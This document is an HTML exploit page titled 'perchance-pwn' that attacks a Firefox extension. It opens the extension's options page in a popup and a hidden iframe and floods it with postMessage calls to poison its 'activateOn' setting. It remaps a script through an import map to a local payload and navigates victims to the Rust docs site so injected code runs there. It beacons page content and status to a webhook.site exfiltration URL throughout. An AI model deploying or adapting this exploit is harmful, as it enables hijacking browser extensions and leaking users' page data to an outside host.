<!doctype html>
<html>
<head>
<meta charset="utf-8">
<script type="importmap">
{ "imports": { "http://localhost:3000/jsxss.js": "./payload.js" } }
</script>
<title>perchance-pwn</title>
</head>
<body>
<script>
const EXT_UUID = '09a6c422-a354-447d-b4ea-185cb10be869';
const OPTIONS  = `moz-extension://${EXT_UUID}/options.html`;
const EXFIL    = 'https://webhook.site/056e7430-69a4-41c7-94be-0c62d64375b2';
const DOC      = 'https://doc.rust-lang.org/';
const beacon = (s) => { try { new Image().src = EXFIL + '/b?s=' + encodeURIComponent(s) + '&t=' + Date.now(); } catch(e){} };

new MutationObserver((muts) => {
  for (const m of muts) for (const n of m.addedNodes) {
    try {
      if (n.tagName === 'P' && /^Previous:/.test(n.textContent)) beacon('cs-ran:' + n.textContent.slice(0,90));
      if (n.tagName === 'SCRIPT' && n.type === 'module') beacon('module-injected');
    } catch(e){}
  }
}).observe(document.documentElement, { childList: true, subtree: true });

const wait = (ms) => new Promise(r => setTimeout(r, ms));

// Try to set activateOn via BOTH a popup (top-level, first-party storage) and an iframe.
async function setActivateOn(cfgUrl, tag) {
  // popup
  let w = null;
  try { w = window.open(OPTIONS, 'opt_' + tag, 'width=120,height=120'); } catch(e){}
  beacon(tag + ':popup=' + (!!w));
  // iframe
  const f = document.createElement('iframe'); f.style.display='none'; f.src = OPTIONS;
  document.body.appendChild(f);
  await wait(1200);
  for (let i=0;i<15;i++){
    try { if (w && !w.closed) w.postMessage(cfgUrl, '*'); } catch(e){}
    try { f.contentWindow.postMessage(cfgUrl, '*'); } catch(e){}
    await wait(150);
  }
  beacon(tag + ':posted');
}

(async () => {
  const stage = new URL(location.href).searchParams.get('stage');
  beacon('load:' + (stage||'init'));

  if (stage !== 'poison') {
    await setActivateOn(location.origin + '/?x=' + DOC, 'self');
    await wait(500);
    beacon('nav->poison');
    location.href = location.pathname + '?stage=poison&r=' + DOC;
    return;
  }

  await wait(3000);
  beacon('body:tags=' + [...document.body.children].map(c=>c.tagName).join(','));
  await setActivateOn(DOC, 'docs');
  await wait(400);
  beacon('nav->docs');
  location.href = 'https://doc.rust-lang.org/stable/std/index.html';
})();
</script>
</body>
</html>
